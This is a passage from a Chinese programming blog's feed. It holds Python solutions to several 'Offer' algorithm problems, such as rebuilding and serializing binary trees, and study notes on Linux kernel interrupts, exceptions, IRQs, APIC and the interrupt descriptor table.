class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#先用字典单独复制每一个节点信息</span></span><br><span class="line">            d[node] = Node(node.val)</span><br><span class="line">            node = node.next</span><br><span class="line">        node = head <span class="comment">#保留头节点不改变</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#链接每一个单节点</span></span><br><span class="line">            d[node].next = d.get(node.next)</span><br><span class="line">            d[node].random = d.get(node.random)</span><br><span class="line">            node = node.next</span><br><span class="line">        <span class="keyword">return</span> d[head]</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-07-重建二叉树-medium"><a href="#剑指-Offer-07-重建二叉树-medium" class="headerlink" title="剑指 Offer 07. 重建二叉树(medium)"></a>剑指 Offer 07. 重建二叉树(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildTree</span><span class="params">(self, preorder, inorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type preorder: List[int]</span></span><br><span class="line"><span class="string">        :type inorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> preorder:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(preorder[<span class="number">0</span>]) <span class="comment">#将前序遍历第一个值作为根节点</span></span><br><span class="line">        index = inorder.index(preorder[<span class="number">0</span>]) <span class="comment">#找到根节点再中序遍历中的位置</span></span><br><span class="line">        root.left = self.buildTree(preorder[<span class="number">1</span>:<span class="number">1</span>+index],inorder[:index]) <span class="comment">#递归构建左子树</span></span><br><span class="line">        root.right = self.buildTree(preorder[<span class="number">1</span>+index:],inorder[index+<span class="number">1</span>:]) <span class="comment">#递归构建右子树</span></span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-45-把数组排成最小的数-medium"><a href="#剑指-Offer-45-把数组排成最小的数-medium" class="headerlink" title="剑指 Offer 45. 把数组排成最小的数(medium)"></a>剑指 Offer 45. 把数组排成最小的数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        思路分析</span></span><br><span class="line"><span class="string">        依次比较nums中的数字，将尽可能组合起来小的数放在res数组的前面</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#先准备一个空的数组，用来存数组</span></span><br><span class="line">        res = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment">#如果res为空，那么直接添加当前数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                res.append(i)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果res不为空，则从nums的当前数与res中的每一个数组合起来进行比较</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                分别将当前数字和res中的每一个数字组合进行比较</span></span><br><span class="line"><span class="string">                例如nums当前数是30，res中的当前数是3</span></span><br><span class="line"><span class="string">                我们会得到两个组合，分别是303和330</span></span><br><span class="line"><span class="string">                将这两个数进行比较，发现303会小一些，所以我们将3放在30后面</span></span><br><span class="line"><span class="string">                在res数组中表现为继续向后比较</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                s1 = str(res[j]) + str(i)</span><br><span class="line">                s2 = str(i) + str(res[j])</span><br><span class="line">                <span class="keyword">if</span> int(s1) &lt; int(s2):</span><br><span class="line">                    <span class="keyword">continue</span> <span class="comment">#继续向后比较</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment">#如果nums中的数放在res[j]之前会使得值更小一些</span></span><br><span class="line">                    <span class="comment">#那么我们就把nums中的当前数插入到res[j]之前这个位置</span></span><br><span class="line">                    res[j:j] = [i]</span><br><span class="line">                    <span class="comment">#flag=1说明已经nums中的值已经插入到res中了，不需要再比较了</span></span><br><span class="line">                    <span class="comment">#直接退出res循环</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#如果flag=0说明res已经遍历结束</span></span><br><span class="line">            <span class="comment">#这个时候只需要将nums当前值插入到res后面即可</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(i)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            s += str(i)</span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-37-序列化二叉树-hard"><a href="#剑指-Offer-37-序列化二叉树-hard" class="headerlink" title="剑指 Offer 37. 序列化二叉树(hard)"></a>剑指 Offer 37. 序列化二叉树(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.strTree=[]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""Encodes a tree to a single string.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            self.strTree.append(<span class="string">"null"</span>)</span><br><span class="line">            <span class="keyword">return</span> self.strTree</span><br><span class="line">        curStr = str(root.val)</span><br><span class="line">        self.strTree.append(curStr)</span><br><span class="line">        self.serialize(root.left)</span><br><span class="line">        self.serialize(root.right)</span><br><span class="line">        <span class="keyword">return</span> self.strTree</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Decodes your encoded data to tree.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type data: str</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span> <span class="keyword">and</span> data[<span class="number">0</span>] == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        Tval = data.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> Tval == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(Tval)</span><br><span class="line">        root.left = self.deserialize(data)</span><br><span class="line">        root.right = self.deserialize(data)</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># codec = Codec()</span></span><br><span class="line"><span class="comment"># codec.deserialize(codec.serialize(root))</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot;&gt;&lt;a href=&quot;#剑指-Offer-43-1～n-整数中-1-出现的次数-hard&quot; class=&quot;headerlink&quot; title=&quot;剑指 Offer 43. 1～n 整数中 1 出现的次数
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>深入理解linux内核之中断和异常</title>
    <link href="elssm.github.io/2021/11/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8%E4%B9%8B%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
    <id>elssm.github.io/2021/11/23/深入理解linux内核之中断和异常/</id>
    <published>2021-11-23T13:51:39.000Z</published>
    <updated>2021-12-13T09:53:03.099Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。</p><p>中断通常分为同步(synchronous)中断和异步(asynchronous)中断：</p><ul><li>同步中断是当指令执行时由CPU控制单元产生的，之所以称为同步，是因为只有在一条指令终止执行后CPU才会发出中断。</li><li>异步中断是由其他硬件设备依照CPU时钟信号随机产生的。</li></ul><p>在Intel微处理器手册中，把同步和异步中断分别称为异常(exception)和中断(interrupt)</p><p>中断是由<strong>间隔定时器</strong>和<strong>I/O设备</strong>产生的，例如，用户的一次按键会引起一个中断。</p><p>异常是由程序的错误产生的，或者是由内核必须处理的异常条件产生的。第一种情况下，内核通过发送一个信号来处理异常，例如<code>SIGTERM、SIGINT</code>等。第二种情况下，内核执行恢复异常需要的所有步骤，例如缺页，或对内核服务的一个请求。</p><h4 id="中断信号的作用"><a href="#中断信号的作用" class="headerlink" title="中断信号的作用"></a>中断信号的作用</h4><p>中断信号提供了一种特殊的方式，使得处理器转而去运行正常控制流之外的代码。当一个中断信号到达时，CPU必须停止它当前所做的事情，并且切换到一个新的活动，为了做到这一点，就要在内核态堆栈保存程序计数器的当前值(即eip和cs寄存器的内容)，并把与中断类型相关的一个地址放进程序计数器。</p><p>必须要声明的是，中断处理与进程切换有一个明显的差异：由中断或异常处理程序执行的代码不是一个进程。更确切地说，它是一个内核控制路径，代表中断发生时正在运行的进程执行，作为一个内核控制路径，中断处理程序比一个进程要“轻”（这是因为中断的上下文很少，建立或终止中断处理需要的事件很少）</p><p>中断处理是由内核执行的最敏感的任务之一，它必须满足以下约束</p><ul><li>内核的目标就是让中断尽可能快的处理完，尽其所能把更多的处理向后推迟，例如，假设一个数据块已经到达了网线，当硬件中断内核时，内核只简单的标志数据到来了，让处理器恢复到它以前运行的状态，其余的处理稍后再进行（如把数据移入一个缓冲区，它的接收进程可以在缓冲区找到数据并恢复这个进程的执行）。因此，内核响应中断后需要进行的操作分为两部分：对于关键紧急的部分，内核立即执行；其余部分内核随后执行。</li><li>因为中断随时会到来，所以内核可能正在处理其中一个中断时，另一个中断又发生了，应该尽可能多的允许这种情况发生，因为这能维持更多的I/O设备处于忙状态。因此，中断处理程序必须编写成使相应的内核控制路径能以嵌套的方式执行。当最后一个内核控制路径终止时，内核必须能恢复被中断进程的执行，或者，如果中断信号已导致了重新调度，内核能切换到另外的进程。</li><li>尽管内核在处理前一个中断时可以接受一个新的中断，但在内核代码中还是存在一些临界区，在临界区中，中断必须被禁止。必须尽可能地限制这样的临界区，因为根据以前的要求，内核尤其是中断处理程序，应该在大部分时间内以开中断的方式运行。</li></ul><h4 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h4><h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><ul><li>可屏蔽中断：I/O设备发出的所有中断请求都产生可屏蔽中断。可屏蔽中断可以处于两种状态：屏蔽的(masked)或非屏蔽的(unmasked)，一个屏蔽的中断只要还是屏蔽的，控制单元就忽略它。</li><li>非屏蔽中断：只有几个危机事件(如硬件故障)才引起非屏蔽中断，非屏蔽中断总是由CPU辨认</li></ul><h5 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h5><ul><li>处理器探测异常：当CPU执行指令时探测到的一个反常条件所产生的异常。可以进一步分为三组。这取决于CPU控制单元产生异常时保存在内核态堆栈<code>eip</code>寄存器中的值<ul><li>故障(fault)：通常可以纠正，一旦纠正，程序就可以在不失连贯性的情况下重新开始。保存在<code>eip</code>中的值是引起故障的指令地址，因此，当异常处理程序终止时，那条指令会被重新执行。</li><li>陷阱(trap)：在陷阱指令执行后立即报告，内核把控制权返回给程序后就可以继续执行它的执行而不失连贯性，保存在<code>eip</code>中的值是一个随后要执行的指令地址。只有当没有必要重新执行已终止的指令时，才触发陷阱，<strong>陷阱的主要用途是为了调试程序</strong>。在这种情况下，中断信号的作用是通知调试程序一条特殊指令已被执行(例如到了一个程序的断点)。一旦用户检查到调试程序所提供的数据，他就可能要求被调试程序从下一条指令重新开始执行。</li><li>异常中止(abort)：发生一个严重的错误，控制单元出了问题，不能在<code>eip</code>寄存器中保存引起异常的指令所在的确切位置。异常中止用于报告严重的错误，如硬件故障或系统表中无效的值或不一致的值。由控制单元发生的这个中断信号是紧急信号，用来把控制权切换到相应的异常中止处理程序，这个异常中止处理程序除了强制受影响的进程终止外，没有别的选择。</li></ul></li><li>编程异常：在编程者发出请求时发生。是由<code>int</code>或<code>int3</code>指令触发的，当<code>into</code>(检查溢出)和<code>bound</code>(检查越界)指令检查的条件不为真时，也引起编程异常。控制单元把编程异常作为陷阱来处理，编程异常通常也叫做<strong>软中断</strong>。这样的异常有两种常用的用途：执行系统调用及给调试程序通报一个特定的事件。</li></ul><p>每个中断和异常是由0~255之间的一个数来标识，因为一些未知的原因，Intel把这个8位的无符号整数叫做一个向量(vector)。非屏蔽中断的向量和异常的向量是固定的。而可屏蔽中断的向量可以通过对中断控制器的编程来改变。</p><h4 id="IRQ和中断"><a href="#IRQ和中断" class="headerlink" title="IRQ和中断"></a>IRQ和中断</h4><p>每个能够发出中断请求的硬件设备控制器都有一条名为IRQ(Interrupt ReQuest)的输出线，所有现有的IRQ线都与一个名为可编程中断控制器(Programmable Interrupt Controller,PIC)的硬件电路的输入引脚相连，可编程中断控制器执行下列动作</p><ul><li>监视IRQ线，检查产生的信号(raised signal)。如果有条或两条以上的IRQ线上产生信号，就选择引脚编号较小的IRQ线，</li><li>如果一个引发信号出现在IRQ线上<ul><li>把接收到的引发信号转换成对应的向量</li><li>把这个向量存放在中断控制器的一个I/O端口，从而允许CPU通过数据总线读此向量</li><li>把引发信号发送到处理器的INTR引脚，即产生一个中断</li><li>等待，直到CPU通过把这个中断信号写进可编程中断控制器的一个I/O端口来确认它，当这种情况发生时，清INTR线。</li></ul></li><li>返回到监视IRQ线操作</li></ul><p>IRQ线是从0开始顺序编号的，因此，第一条IRQ线通常表示为IRQ0，与IRQn关联的Intel的缺省向量是n+32。如前所述，通过向中断控制器端口发布合适的指令，就可以修改IRQ和向量之间的映射。</p><p>可以有选择地禁止每条IRQ线。因此，可以对PIC编程从而禁止IRQ，也就是说，可以告诉PIC停止对给定的IRQ线发布中断，或者激活它们。禁止的中断是丢失不了的，它们一旦被激活，PIC就又把它们发送到CPU。这个特点被大多数中断处理程序使用，因为这允许中断处理程序逐次地处理同一类型的IRQ。</p><h4 id="高级可编程中断控制器"><a href="#高级可编程中断控制器" class="headerlink" title="高级可编程中断控制器"></a>高级可编程中断控制器</h4><p>如果系统只有一个单独的CPU，那么主PIC的输出线可以直截了当的连接到CPU的INTR引脚。然而，如果系统中包含两个或多个CPU，那么这种方式不再有效，因而需要更复杂的PIC。</p><p>Intel从<code>Pentiun III</code>开始引入了一种名为I/O高级可编程控制器(APIC)的新组件。此外，<code>80x86</code>微处理器当前所有的CPU都含有一个本地<code>APIC</code>。每个本地<code>APIC</code>都有32位的寄存器、一个内部时钟、一个本地定时设备及为本地<code>APIC</code>中断保留的两条额外的IRQ线<code>LINR0</code>和<code>LINT1</code>。所有本地<code>APIC</code>都连接到一个外部<code>I/O APIC</code>，形成一个多<code>APIC</code>的系统。</p><h4 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h4><p><code>80x86</code>微处理器发布了大约20种不同的异常。内核必须为每种异常提供一个专门的异常处理程序。对于某些异常，CPU控制单元在开始执行异常处理程序前会产生一个硬件出错码，并且压入内核态堆栈。</p><p>在<code>80x86</code>处理器中可以找到的异常的向量、名字、类型及其描述如下</p><ul><li>0 “Divide error”（故障）：当一个程序试图执行整数被0除操作时产生</li><li>1 “Debug”（陷阱或故障）：设置<code>eflags</code>的TF标志时或一条指令或操作数的地址落在一个活动debug寄存器的范围之内时</li><li>2 未用 ：为非屏蔽中断保留（利用NMI引脚的那些中断）</li><li>3 “Breakpoint” （陷阱）：由<code>int3</code>(断点)指令引起</li><li>4 “Overflow”（陷阱）：当<code>eflags</code>的OF标志被设置时，<code>into</code>(检查溢出)指令被执行</li><li>5 “Bounds check”（故障）：对于有效抵制范围之外的操作数，bound(检查地址边界)指令被执行</li><li>6 “Invalid opcode”（故障）：CPU执行单元检测到一个无效的操作码</li><li>7 “Device not available”（故障）：随着<code>cr0</code>的TS标志被设置，ESCAPE、MMX或XMM指令被执行</li><li>8 “Double fault”（异常中止）：正常情况下，当CPU试图为前一个异常调用处理程序时，同时又检测到一个异常，两个异常能被串行地处理。然而，在少数情况下，处理器不能串行地处理它们，因而产生这种异常。</li><li>9 “Coprocessor segment overrun”（异常中止）：因外部的数学斜处理器引起的问题</li><li>10 “Invalid TSS”（故障）：CPU试图让一个上下文切换到有无效的TSS的进程</li><li>11 “Segment not present”（故障）：引用一个不存在的内存段</li><li>12 “Stack segment fault”（故障）：试图超过栈段界限的指令，或者由ss标识的段不在内存</li><li>13 “General protection”（故障）：违反了<code>80x86</code>保护模式下的保护规则之一</li><li>14 “Page fault”（故障）：寻址的页不在内存，相应的页表项为空，或者违反了一种分页保护机制</li><li>15 由Intel保留</li><li>16 “Floating point error”（故障）：集成到CPU芯片中的浮点单元用信号通知一个错误情形，如数字溢出，或被0除</li><li>17 “Alignment check”（故障）：操作数的地址没有被正确的对齐</li><li>18 “Machine check”（异常中止）：机器检查机制检测到一个CPU错误或总线错误</li><li>19 “SIMD floating point exception”（故障）：集成到CPU芯片中的SSE或SSE2单元对浮点操作用信号通知一个错误情形</li><li>20～31这些值由Intel留作将来开发</li></ul><div class="table-container"><table><thead><tr><th>编号</th><th>异常</th><th>异常处理程序</th><th>信号</th></tr></thead><tbody><tr><td>0</td><td>Divide error</td><td>divide_error()</td><td>SIGFPE</td></tr><tr><td>1</td><td>Debug</td><td>debug()</td><td>SIGTRAP</td></tr><tr><td>2</td><td>NMI</td><td>nmi()</td><td>None</td></tr><tr><td>3</td><td>Breakpoint</td><td>int3()</td><td>SIGTRAP</td></tr><tr><td>4</td><td>Overflow</td><td>overflow()</td><td>SIGSEGV</td></tr><tr><td>5</td><td>Bounds check</td><td>bounds()</td><td>SIGSEGV</td></tr><tr><td>6</td><td>Invalid opcode</td><td>invalid_op()</td><td>SIGILL</td></tr><tr><td>7</td><td>Device not available</td><td>device_not_available()</td><td>None</td></tr><tr><td>8</td><td>Double fault</td><td>doublefault_fn()</td><td>None</td></tr><tr><td>9</td><td>Coprocessor segment overrun</td><td>coprocessor_segment_overrun()</td><td>SIGFPE</td></tr><tr><td>10</td><td>Invalid TSS</td><td>invalid_tss()</td><td>SIGSEGV</td></tr><tr><td>11</td><td>Segment not present</td><td>segment_not_present()</td><td>SIGBUS</td></tr><tr><td>12</td><td>Stack exception</td><td>stack_segment()</td><td>SIGBUS</td></tr><tr><td>13</td><td>General protection</td><td>general_protection()</td><td>SIGSEGV</td></tr><tr><td>14</td><td>Page fault</td><td>page_fault()</td><td>SIGSEGV</td></tr><tr><td>15</td><td>Intel reserved</td><td>None</td><td>None</td></tr><tr><td>16</td><td>Floating point error</td><td>coprocessor_error()</td><td>SIGFPE</td></tr><tr><td>17</td><td>Alignment check</td><td>alignment_check()</td><td>SIGSEGV</td></tr><tr><td>18</td><td>Machine check</td><td>machine_check()</td><td>None</td></tr><tr><td>19</td><td>SIMD floating point</td><td>simd_coprocessor_error()</td><td>SIGFPE</td></tr></tbody></table></div><h4 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h4><p>中断描述符表(Interrupt Descriptor Table,IDT)是一个系统表，它与每一个中断或异常向量相联系，每一个向量在表中有相应的中断或异常处理程序的入口地址。内核在允许中断发生前，必须适当的初始化IDT</p><p>IDT包含三种类型的描述符，下图显示了每种描述符中的64位的含义，值得注意的是，在40～43位的Type字段的值表示描述符的类型。</p><p><img src="/2021/11/23/深入理解linux内核之中断和异常/1.png" alt="1"></p><ul><li>任务门(task gate)：当中断信号发生时，必须取代当前进程的那个进程的TSS选择符放在任务门中</li><li>中断门(interrupt gate)：包含段选择符和中断或异常处理程序的段内偏移量。当控制权转移到一个适当的段时，处理器清IF标志，从而关闭将来会发生的可屏蔽中断</li><li>陷阱门(Trap gate)：与中断门相似，只是控制权传递到一个适当的段时处理器不修改IF标志</li></ul><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p>CPU产生的大部分异常都由Linux解释为出错条件，当其中一个异常发生时，内核就向引起异常的进程发送一个信号向它通知一个反常条件，例如，如果进程执行了一个被0除的操作，CPU就产生一个”Divide error”异常，并由相应的异常处理程序向当前进程发送一个SIGFPE信号，这个进程将采取若干必要的步骤来恢复或者中止运行。</p><p>异常处理程序有一个标准的结构，由以下三部分组成</p><ul><li>在内核堆栈中保存大多数寄存器的内容</li><li>用高级的C函数处理异常</li><li>通过<code>ret_from_exception()</code>函数从异常程序退出</li></ul><p>为了利用异常，必须对IDT进行适当的初始化，使得每个被确认的异常都有一个异常处理程序。<code>trap_init()</code>函数的工作时将一些最终值(即处理异常的函数)插入到IDT的非屏蔽中断及异常表项中，这是由函数<code>set_trap_gate()</code>、<code>set_intr_gate()</code>、<code>set_system_intr_gate()</code>和<code>set_task_gate()</code>来完成的</p><h4 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h4><p>中断处理依赖于中断类型，目前主要有三种主要的中断类型。</p><ul><li>I/O中断：某些I/O设备需要关注，相应的中断处理程序必须查询设备以确定适当的操作过程</li><li>时钟中断：某些时钟产生一个中断，这种中断告诉内核一个固定的时间间隔已经过去</li><li>处理器中断：多处理器系统中一个CPU对另一个CPU发出一个中断</li></ul><h4 id="I-O中断处理"><a href="#I-O中断处理" class="headerlink" title="I/O中断处理"></a>I/O中断处理</h4><p>中断处理程序的灵活性是以两种不同的方式实现的</p><ul><li>IRQ共享：中断处理程序执行多个中断服务例程(interrupt service routine，ISR)，每个ISR是一个与单独设备(共享IRQ线)相关的函数。因为不可能预先知道哪个特定的设备产生IRQ，因此，每个ISR都被执行，以验证它的设备是否需要关注，如果是，当设备产生中断时，就执行需要执行的所有操作。</li><li>IRQ动态分配：一条IRQ线在可能的最后时刻才与一个设备驱动程序相关联，例如，软盘设备的IRQ线只有在用户访问软盘设备时才被分配。这样，即使几个硬件设备并不共享IRQ线，同一个IRQ向量也可以由这几个设备在不同时刻使用。</li></ul><p>当一个中断发生时，并不是所有的操作都具有相同的急迫性。事实上，把所有的操作都放进中断处理程序本身并不合适，需要时间长的、非重要的操作应该推后，因为当一个中断处理程序正在运行时，相应的IRQ线上发出的信号就被暂时忽略。更重要的是，中断处理程序是代表进程执行的，它所代表的进程必须总处于<code>TASK_RUNNING</code>状态，否则，就可能出现系统僵死情形。因此，中断处理程序不能执行任何阻塞过程。如磁盘I/O操作，因此Linux把紧随中断要执行的操作分为三类</p><ul><li>紧急的（Critical）：这样的操作诸如：对PIC应答中断，对PIC或设备控制器重编程，或者修改由设备和处理器同时访问的数据结构，这些都能被很快地执行，而之所以说它们是紧急的是因为他们必须被尽快的执行。紧急操作要在一个中断处理程序内立即执行，而且是在禁止可屏蔽中断的情况下。</li><li>非紧急的（Noncritical）：这样的操作诸如修改那些只有处理器才会访问的数据结构，这些操作也要很快地完成，因此，它们由中断处理程序立即执行，但必须是在开中断的情况下。</li><li>非紧急可延迟的（Noncritical deferrable）：这样的操作例如把缓冲区的内容拷贝到某个进程的地址空间。这些操作可能被延迟较长的时间间隔而不影响内核操作。</li></ul><p>不管引起中断的电路种类如何，所有的I/O中断处理程序都执行四个相同的基本操作</p><ul><li>在内核态堆栈中保存IRQ的值和寄存器的内容</li><li>为正在给IRQ线服务的PIC发送一个应答，这将允许PIC进一步发出中断</li><li>执行共享这个IRQ的所有设备的中断服务例程(ISR)</li><li>跳到<code>ret_from_intr()</code>的地址后终止</li></ul><p>Linux中的中断向量</p><div class="table-container"><table><thead><tr><th>向量范围</th><th>用途</th></tr></thead><tbody><tr><td>0～19(0x0~0x13)</td><td>非屏蔽中断和异常</td></tr><tr><td>20~31(0x14~0x1f)</td><td>Intel保留</td></tr><tr><td>32~127(0x20~0x7f)</td><td>外部中断(IRQ)</td></tr><tr><td>128(0x80)</td><td>用于系统调用的可编程异常</td></tr><tr><td>129~238(0x81~0xee)</td><td>外部中断(IRQ)</td></tr><tr><td>239(0xef)</td><td>本地APIC时钟中断</td></tr><tr><td>240(0xf0)</td><td>本地APIC高温中断</td></tr><tr><td>241~250(0xf0~0xfa)</td><td>由Linux留作将来使用</td></tr><tr><td>251~253(0xfb~0xff)</td><td>处理器间中断</td></tr><tr><td>254(0xfe)</td><td>本地APIC错误中断</td></tr><tr><td>255(0xff)</td><td>本地APIC伪中断</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
